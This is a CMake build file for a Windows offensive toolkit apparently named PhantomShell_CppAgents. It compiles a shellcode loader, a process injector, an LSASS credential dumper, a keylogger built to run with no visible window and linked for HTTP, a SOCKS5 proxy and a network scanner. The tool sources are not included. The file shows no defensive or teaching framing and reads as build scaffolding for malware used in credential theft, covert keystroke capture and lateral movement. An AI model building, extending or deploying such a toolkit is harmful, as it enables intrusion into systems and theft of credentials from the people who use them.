cmake_minimum_required(VERSION 3.15)
project(PhantomShell_CppAgents VERSION 5.2 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Windows x64 target
if(MSVC)
    add_compile_options(/W3 /O2 /DWIN32_LEAN_AND_MEAN /D_CRT_SECURE_NO_WARNINGS)
    add_link_options(/SUBSYSTEM:CONSOLE)
elseif(MINGW)
    add_compile_options(-Wall -O2 -DWIN32_LEAN_AND_MEAN -static)
    add_link_options(-static -static-libgcc -static-libstdc++)
endif()

# Common include directory
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/common)

# --- Tool 1: PhantomLoader ---
add_executable(PhantomLoader shellcode_loader/loader.cpp)
target_link_libraries(PhantomLoader PRIVATE ws2_32 dbghelp ntdll)

# --- Tool 2: PhantomInject ---
add_executable(PhantomInject process_inject/inject.cpp)
target_link_libraries(PhantomInject PRIVATE ntdll)

# --- Tool 3: PhantomDump ---
add_executable(PhantomDump lsass_dump/dump.cpp)
target_link_libraries(PhantomDump PRIVATE dbghelp advapi32 ntdll)

# --- Tool 4: PhantomKey ---
add_executable(PhantomKey keylogger/keylog.cpp)
target_link_libraries(PhantomKey PRIVATE winhttp)
if(MSVC)
    set_target_properties(PhantomKey PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
elseif(MINGW)
    target_link_options(PhantomKey PRIVATE -mwindows)
endif()

# --- Tool 5: PhantomSocks ---
add_executable(PhantomSocks socks5_proxy/socks5.cpp)
target_link_libraries(PhantomSocks PRIVATE ws2_32)

# --- Tool 6: PhantomScan ---
add_executable(PhantomScan scanner/scanner.cpp)
target_link_libraries(PhantomScan PRIVATE ws2_32)

# Install all binaries to bin/
install(TARGETS PhantomLoader PhantomInject PhantomDump PhantomKey PhantomSocks PhantomScan
        RUNTIME DESTINATION bin)
